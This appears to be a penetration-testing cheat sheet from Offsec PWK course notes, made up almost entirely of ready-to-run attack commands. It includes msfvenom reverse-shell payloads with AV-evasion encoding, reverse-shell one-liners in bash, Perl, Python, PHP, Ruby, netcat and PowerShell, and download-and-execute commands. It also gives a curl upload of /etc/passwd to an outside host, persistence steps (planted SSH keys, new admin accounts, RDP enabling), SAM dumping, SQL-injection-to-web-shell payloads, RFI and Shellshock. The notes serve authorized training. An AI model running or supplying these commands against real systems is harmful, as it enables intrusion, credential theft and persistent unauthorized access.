# Offsec

Offsec PWK notes and frecuently used files.

<h4><ol>
  <li><a href="#Scanning">Scanning and Enumeration</a></li>
  <li><a href="#Exploitation">Exploitation</a></li>
  <li><a href="#ExploitDevelopment">Exploit Development</a></li>
  <li><a href="#PasswordAttacks">Password Attacks</a></li>
  <li><a href="#ReverseShells">Reverse Shells</a></li>
  <li><a href="#PrivilegeEscalation">Privilege Escalation</a></li>
  <li><a href="#FileTransfers">File Transfers</a></li>
  <li><a href="#PostExploitation">Post Exploitation </a></li>
  <li><a href="#PortForwarding">Port Forwarding</a></li>
  <li><a href="#WebAttacks">Web Attacks</a></li>
  <li><a href="#LessonsLearned">Lessons Learned</a></li>
</ol></h4>

<h4>

        Local IP: 10.10.10.10

        Target IP: 1.1.1.1

</h4>

<div id="Scanning"> <h3>1.Scanning and Enumeration</h3></div>

<h4> NMAP</h4>

    nmap++ 1.1.1.1

<h4> SMB</h4>

    nbtscan -r 1.1.1.1

    enum4linux -USGPoi 1.1.1.1 >> SMB.txt

    smbclient -L 1.1.1.1

    showmount -e 1.1.1.1

<h4> SMTP </h4>

    nmap -p 25 --script smtp-enum-users.nse,smtp-commands.nse 1.1.1.1

<h4> SNMP</h4>

    snmpcheck -t 1.1.1.1 >> ENUM-SNMP.txt

    snmpwalk -c public 1.1.1.1  -v 2c

    onesixtyone -c public.txt -o snmp-onesixtyone.txt -dd 1.1.1.1 

<h4> HTTP</h4>

    nikto -o nikto.html -Display V -nolookup -host 1.1.1.1  && firefox nikto.html

    dirb http://1.1.1.1 /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -l -o dirb.txt

    Dirbuster: Change to 50 req/s, no recursion, export simple list. 

<h4> SSH </h4>

    msf > use auxiliary/scanner/ssh/ssh_enumusers

<div id="Exploitation"> <h3>2. Exploitation</h3></div>

<h4>MSF Venom Payload Generation</h4>

    msfvenom -p windows/shell_reverse_tcp -f asp -o shell.asp LHOST=10.10.10.10 LPORT=443

    use exploit/multi/handler
    set payload windows/shell/reverse_tcp
    set LHOST 10.10.10.10
    set LPORT 443
    run

<br>

    msfvenom -p windows/meterpreter_reverse_tcp -f exe -o metp.exe -e x86/shikata_ga_nai LHOST=10.10.10.10 LPORT=443

    msfconsole

    use exploit/multi/handler
    set payload windows/meterpreter_reverse_tcp
    set LHOST 10.10.10.10
    set LPORT 443
    run


<h4>Windows Pash the Hash</h4>

    export SMBHASH=903805A370A06846300175DD6E8654A6:4AFCBB33AC6EE45C73B37E5130F25971
    pth-winexe -U john //1.1.1.1 cmd 


<h4>Shellshock RCE</h4>

    curl http://1.1.1.1/cgi-bin/admin.cgi -H"User-Agent:() { :; }; /bin/bash -c ifconfig “

<h4>Compiling .exe Files with mingw32</h4>

    i586-mingw32msvc-gcc MS08-067.c -o MS08-067.exe  -lrpcrt4 -lws2_32 -lwsock32 -lmpr

<h4>Compiling For Windows with Pyinstaler</h4>

    i686-w64-mingw32-gcc MS08-067.c -o MS08-067.exe  -lrpcrt4 -lws2_32 -lwsock32 -lmpr

<div id="ExploitDevelopment"> <h3>3. Exploit Development</h3></div>

<h4>1. Fuzz</h4>

    ./fuzzer.py 

<h4>2. Create a unique pattern and locate the offset for EIP </h4>

    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700 

<b>Debugger:</b> write down value of EIP (e.g. 39694438)

    /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2700 -q 39694438

<h4>3. Update skeleton script to match new buffer size, pad with a different char (x42) 4 bytes to overwrite EIP. </h4>

<h4>4. Locate space for shell code (i.e add more “C”s ~400 bytes) 
</h4>

    /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

<h4>5. Locate bad characters: append to skeleton script right after x42s, Immunity: ESP Follow in Dump </h4>


<h4>6. Find a return address (Typically JMP ESP - FFE4)</h4>

Criteria: 

    1. Does not contain bad characters
    2. Does not use DEP or ASLR 

Using Mona: 

    !mona modules        
    !mona find -s “\xff\xe4” -m slmfc.dll 
 
<h4>7. Update skeleton script to include Ret Address (little endian) right after the buffer </h4>

<h4>8. Update skeleton script to include NOPs for padding at the beggining of the shellcode</h4>

<h4>9. Generate shellcode and update skeleton script </h4>

    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x09\x0a" 
    
<b> Bypassing AV and FW restrictions </b>

<h4>10. Use staged payloads </h4>

    msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"

    msfconsole
    use exploit/multi/handler
    set PAYLOAD windows/shell/reverse_tcp
    set LHOST 10.10.10.10
    set LPORT 443

<h4>11. Use multiple iterations of the encoder </h4>

    msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=443  -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -i 10 

    msfconsole
    use exploit/multi/handler
    set PAYLOAD windows/shell/reverse_tcp
    set LHOST 10.10.10.10
    set LPORT 443

<h4>12. Use a Reverse HTTPS Meterpreter </h4>

    msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443  -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -i 10 

    msfconsole
    use exploit/multi/handler
    set PAYLOAD windows/meterpreter/reverse_https
    set LHOST 10.10.10.10
    set LPORT 443

<h4>13. Try other ports common ports (53, 80) </h4>

<div id="PasswordAttacks"> <h3>4. Password Attacks</h3></div>

    ncrack -vv --user rax -P wordlist.txt rdp://1.1.1.1

    medusa -h 1.1.1.1 -u root -P /usr/share/wordlists/rockyou.txt -e ns -M ssh

    hydra -l administrator -P wordlist.txt 1.1.1.1 ssh

    hydra 1.1.1.1:80 http-form-post "/PHP/index.php:nickname=^USER^&password=^PASS^:bad password" -l garry -P /usr/share/wordlists/nmap.lst -t 10 -w 30 -o hydra-http-post-attack.txt

<h4> Password Generation with cewl and John </h4>

    cewl http://1.1.1.1/index.html >> words.txt

    john --wordlist=words.txt --rules --stdout >> wordlist.txt

<h4> Cracking Hashes - Linux </h4>

    cat shadow.txt | awk -F':' '{print }' > hashes.txt

    hashcat -m 500 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

    hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

<h4> Cracking Hashes - Windows </h4>

    hashcat -m 1000 -a 0 -o output.txt --remove hashes.txt /usr/share/wordlists/rockyou.txt

<div id="ReverseShells"> <h3>5. Reverse Shells</h3></div>

Local IP: 10.10.10.10 
<br> 

<h4>Bash</h4>

    bash -i >& /dev/tcp/10.10.10.10/7777 0>&1
    
    sh -i >& /dev/tcp/10.10.10.10/7777 0>&1

<h4>PERL</h4>

    perl -e 'use Socket;$i="10.10.10.10";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

<h4>Python</h4>

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10”,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

<h4>PHP</h4>

    php -r '$sock=fsockopen("10.10.10.10”,7777);exec("/bin/sh -i <&3 >&3 2>&3");'

<h4>Ruby</h4>

    ruby -rsocket -e'f=TCPSocket.open("10.10.10.10”,7777).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

<h4>Netcat</h4>

<b>Linux</b>

    nc -vn 10.10.10.10 7777 -e /bin/sh 

<b>Windows</b>

    nc.exe -vn 10.10.10.10 7777 -e cmd.exe

<h4>Java</h4>


    r = Runtime.getRuntime()
    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.10/7777;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
    p.waitFor()


<h4>Powershell</h4>
 
    powershell.exe

    $client = New-Object System.Net.Sockets.TCPClient(“10.10.10.10”,7777);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

<br>

PowerShell with nc.exe or another rev shell .exe

    PowerShell (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10/files/meterpreter.exe','meterpreter.exe');Start-Process ‘meterpreter.exe'

<h4>Windows (Web app with command execution and nc.exe) </h4>

    http://1.1.1.1/backdoor.php?cmd=%22nc.exe%20-vn%2010.10.10.10%207777%20-e%20cmd.exe%22


<div id="PrivilegeEscalation"> <h3>6. Privilege Escalation</h3></div>


<h4>Interactive Shells </h4>

    python -c 'import pty; pty.spawn("/bin/sh")'

<h4>Linux Scripts </h4>

    wget 10.10.10.10/linuxprivchecker.py
    python linuxprivchecker.py

    wget 10.10.10.10/linux-enum-mod.sh
    chmod +x  linux-enum-mod.sh
    sh linux-enum-mod.sh

    wget 10.10.10.10/linux-local-enum.sh
    chmod +x  linux-local-enum.sh
    sh linux-local-enum.sh

    wget 10.10.10.10/unix-privesc-check
    chmod +x ./unix-privesc-check
    ./unix-privesc-check

    wget 10.10.10.10/solaris-exploit-suggester.pl
    perl solaris-exploit-suggester.pl

Local 

    ./linux-exploit-suggester.sh --uname 2.6.18-274.3.1.el5

<h4>Linux Commands</h4>
 
    uname -a
    id
    cat /etc/*-release
    cat /proc/version
    cat /etc/issue
    ifconfig -a
    netstat -ano 
    cat /etc/passwd
    cat /etc/hosts
    arp -a
    iptables -L
    crontab -l
    cat /root/.ssh/known_hosts
    find . -name "*password*"

<h4>SearchSploit root Proceses</h4>

    cat process.txt | grep root | cut -d " " -f 9 | grep "\[" | cut -d "[" -f 2 | cut -d "]" -f1 | cut -d "/" -f1  >> root_process.txt 
    cat root_process.txt | sort -u > proccess.txt 
    for i in `cat process.txt` ; do  searchsploit %i ; done

<h4>Windows Scripts </h4>

<!--

Run from within CMD shell and write out to file.

C:\temp> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt

Run from within CMD shell and write out to screen.

C:\temp> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1

-->

    wpc.exe --audit -a -o report

    cd /Offsec 
    python windows-exploit-suggester.py --database 2018-09-02-mssb.xls --systeminfo sys-info.txt
    python windows-exploit-suggester.py --database 2018-09-02-mssb.xls --ostext 'Windows Server 2008 R2'

<h4>Windows Commands </h4>


    tree /f /a
    systeminfo 
    type boot.ini 
    hostname
    ipconfig /all
    netstat -ano 
    net users
    net localgroups 
    route print
    arp -A
    netsh firewall show state
    netsh firewall show config
    schtasks /query /fo LIST /v
    schtasks /query /fo LIST /v
    net start
    accesschk.exe -uwcqv "Authenticated Users" *
    dir network-secret.txt /s

<h4>Meterpreter Tools</h4>

    run arp_scanner -r 1.1.1.0/24

    use auxiliary/scanner/portscan/tcp

    use post/windows/escalate/getsystem

<h4>External Links</h4>

<a href="https://github.com/Ragab0t/priv-escalation/blob/master/MS_privesc_and_exploits_table.csv">Windows Privilege Escalation Matrix</a>

<a href="https://github.com/Ragab0t/windows-kernel-exploits">Pre-Compiled Windows Exploits</a>

<a href="https://gtfobins.github.io/#">Escaping Restricted Shells</a>

<div id="FileTransfers"> <h3>7. File Transfers</h3></div>

<h4>wget</h4>
 
    wget -O exploit.c 10.10.10.10/exploit.c

<h4>Curl Upload</h4>

    curl --upload-file /etc/passwd http://10.11.0.64:53

<h4>TFTP</h4> 

Local (start the service)

    atftpd --daemon --port 69 /tftp

Remote

    tftp -i 10.10.10.10 get nc.exe


<h4>Windows FTP </h4>

    echo USER>> ftp.txt 
    echo offsec>>ftp.txt 
    echo lab123>>ftp.txt
    echo binary>>ftp.txt
    echo get nc.exe>> ftp.txt 
    echo bye>> ftp.txt 
    ftp -v -n -s:ftp.txt 10.10.10.10

<h4>PowerShell</h4>

    echo $storageDir = $pwd > wget.ps1 
    echo $webclient = New-Object System.Net.WebClient >>wget.ps1 
    echo $url = "http://10.10.10.10/fgdump.exe" >>wget.ps1 
    echo $file = "new.exe" >> wget.ps1
    echo $webclient.DownloadFile($url,$file) >>wget.ps1
    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

<div id="PostExploitation"> <h3>8. Post Exploitation</h3></div>

<h4>Find interesting files </h4>

    dir network-secret.txt /s

    find . -name "network-secret.txt"

<h4>Packet Captures</h4>

    windump -i 2  -w capture -n -U -s 0 src not 10.10.10.10 and dst not 10.10.10.10

    tcpdump -w capture -n -U -s 0 src not 10.10.10.10 and dst not 10.10.10.10

Maintain Access 

<h4>Add Keys to Autorized Keys</h4>

Local machine

    cat ~/.ssh/id_rsa.pub 


Remote machine

    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8q88wXf4E+dmEHH2ccGhGCgNdfgq4y9l4jthBxgGIzztnQs438/WxD+Fm2fwaya3YwLip3da6Pj2x1aH08Y8kYPgou8M+MXC1hD0z5YxZ4W7htfSb3X7a8mKRavcv8h1efyqdCwdzhJG48ZEHDQnspuv2DzwzynFDR89C0M8h5gw0X2Tj3ztl5tOhhJymPWVNHDnLFLDLUFuxC74gEz7rCurWvb1wKZ+XJfurr07ZmWId4tEdb04sabyEru/iEgUJawTbszHQA53BocY64qMcGgWze51RbfQ8ijqkKc88SkVlOxFKI3ecZp3lmeFaAuy8UO3Jx1GNO22SBmEz/v root@Kali" >> /root/.ssh/authorized_keys

<h4>Linux Add Users</h4>

    useradd -u 1037 -g users -d /home/rax -s /bin/bash -p $(echo 1234 | openssl passwd -1 -stdin) rax

<h4>Windows Add users </h4>

    net user rax Cisco123 /add && net localgroup Administrators rax /add

<h4>Windows RDP</h4>

    reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f 

    reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f

    net start Termservice

<h4>Windows Open FW for RDP</h4>

    netsh.exe 
    firewall 
    add portopening TCP 3389 "Remote Desktop" 

<h4>Windows Dump SAM</h4>

    reg save HKLM\SAM %computername%.sam
    reg save HKLM\SYSTEM %computername%.system

    fgdump.exe

<div id="PortForwarding"> <h3>9. Port Forwarding</h3></div>

<h4>PortForward with Meterpreter</h4>

    portfwd add -l 8000 -p 3389 -r 1.1.1.1

<h4>Port Forward Redirection</h4>

All connections to 1.1.1.1:9000 will be forwarded to 2.2.2.2:80

    vi /etc/rinetd.conf 
    # bindaddress bindport connectaddress connectport
    1.1.1.1 9000 2.2.2.2 80
    rinetd

<h4>SSH Local Port Forwarding </h4>

The local machine connects to a host on the outside (1.1.1.) through SSH and- then forwards traffic sent to the local loopback on a given port (9090) to a host on the Internet (2.2.2.2) on a remote port (443) 

    ssh root@1.1.1.1 -L 9090:2.2.2.2:443

<h4>SSH Remote PortForwarding</h4>


A remote host connects to my machine (10.10.10.10) through SSH which is running on port 53 and publishes one if its open ports (10443) through my local loopback on a local port (10000)

    ssh 10.10.10.10 -p 53 -R 10000:127.0.0.1:10443

<h4>Socks4 and Proxychains </h4>

The local machine connects to a remote host 1.1.1.1 and proxies its traffic thru the remote host to another host 2.2.2.2

    ssh -D 8080 root@1.1.1.1
    proxychains nmap -p 22,80,222,10000 -sT -Pn 2.2.2.2

<div id="WebAttacks"> <h3>10. Web Attacks</h3></div>


<h4>ZAP</h4>

Mapping and Scanning (unauthenticated)

    1. Browse  Site Using ZAP, check all normal functionalities
    2. Go to root directory, right click, spider 
    3. Right Click Active Scan, Show Advanced, select applicable technologies and OS, run

Authentication 

    1. Right click add to new context
    2. Session Management (most likely will be cookie based) 
    3. Go to the Web app and Authenticate
    4. Check Session Tree and look for a POST to the login form, right click and then select “Flag as context”, Form Based Authentication Request. 
    5. Select Username and Password parameter from the dropdown 
    6. Go back to the session three, look for the POST to the login form again, check the response tab and look for a “logged in indicator” in the HTML source code and then right click, flag as context, logged in indicator. 
    7. Add Users under the context “users” tab
    8. Right Click on the index page, attack, then spider, select the user from the drop down. 
    9. Rick Click on the context, active scan, select the user from the drop down 

<h4>General Tips</h4>

    Review Source Code
    Review Response Headers 
    CMS: Review CMS type, version, manual and default admin credentials

<h4>Command Injection </h4>

    curl "https://1.1.1.1/<?php echo shell_exec($_GET['cmd']);?>"

    curl "https://1.1.1.1/%3C%3Fphp%20echo%20shell_exec%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E"

    curl "https://1.1.1.1/section.php?cmd=cat%20/etc/passwd&page=../../../../../proc/self/fd/10%00"

Shellshock

    curl http://1.1.1.1/cgi-bin/admin.cgi -H"User-Agent:() { :; }; /bin/bash -c ifconfig “
<h4>SQL Injection </h4>


Vulnerable URL/Parameter: 

    http://1.1.1.1/mvc/Product.aspx?id=1

<h5>1. Enumerate if vulnerable</h5>

    id=1' 

<h5>2. Enumerate DB Number of colums </h5>

    id=1 order by 1
    id=1 order by 2
    ...
    id=1 order by 9 

    id=1 union all select 1,2,3,4,5,6,7,8

<h5>3. Enumerate DB Version </h5>

    id=-1 UNION SELECT version(),2,3,4,5,6,7,8

<h5>4. Enumerate DB User </h5>

    id=99999 UNION SELECT user(),2,3,4,5,6,7,8

<h5>5. Enumerate DB Name </h5>

    id=1=2 UNION SELECT database(),2,3,4,5,6,7,8

<h5>6. Enumerate Table Names </h5>

    id=0 and 1=2 UNION SELECT table_name,2,3,4,5,6,7,8 from information_schema.tables where table_schema='bricks'

<h5>7. Enumerate Table Users </h5>

    id=0 and 1=2 UNION SELECT column_name,2,3,4,5,6,7,8 from information_schema.columns where table_schema='bricks' and table_name='users' LIMIT 0,1 -- -
    ... 
    id=0 and 1=2 UNION SELECT column_name,2,3,4,5,6,7,8 from information_schema.columns where table_schema='bricks' and table_name='users' LIMIT 7,1 -- -

<h5>8. Extract Name and Password </h5>

    id=0 and 1=2 UNION SELECT concat(name,CHAR(32),password),2,3,4,5,6,7,8 from bricks.users LIMIT 0,1 -- -
    ...  
    id=0 and 1=2 UNION SELECT concat(name,CHAR(32),password),2,3,4,5,6,7,8 from bricks.users LIMIT 7,1 -- -

<h5>9. SQL to Command Injection </h5>

    id=0 'UNION ALL SELECT 1,2,3,4,5,"<?php echo shell_exec($_GET[\"cmd\"]);?>" into OUTFILE "/var/www/html/rax.php”
    id=0 'UNION ALL SELECT "<?php echo shell_exec($_GET[\"cmd\"]);?>",2,3,4,5,6 into OUTFILE "c:/xampp/htdocs/rax.php" #;

<h4>RFI</h4>

    http://1.1.1.1/index.php?slogin_path=http://10.10.10.10/php-reverse-shell.txt?
    http://1.1.1.1/index.php?slogin_path=http://10.10.10.10/php-reverse-shell.txt%00

Other Resources 

<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20injection/MSSQL%20Injection.md">MSSQL Injection</a>

<a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet">Pentest Monkey MySQL Injection Cheat Sheet</a>

<a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">Pentest Monkey MSSQL Injection Cheat Sheet</a>

<div id="LessonsLearned"> <h3>11. Lessons Learned</h3></div>

<ul>
  <li>Always Review Source Code</li>
  <li>Check Sudo Version </li>
  <li>In most cases RFI vulns can be used as LFIs too</li>
  <li>In most cases LFIs can be used to read arbitrary files on the system </li>
</ul>
 
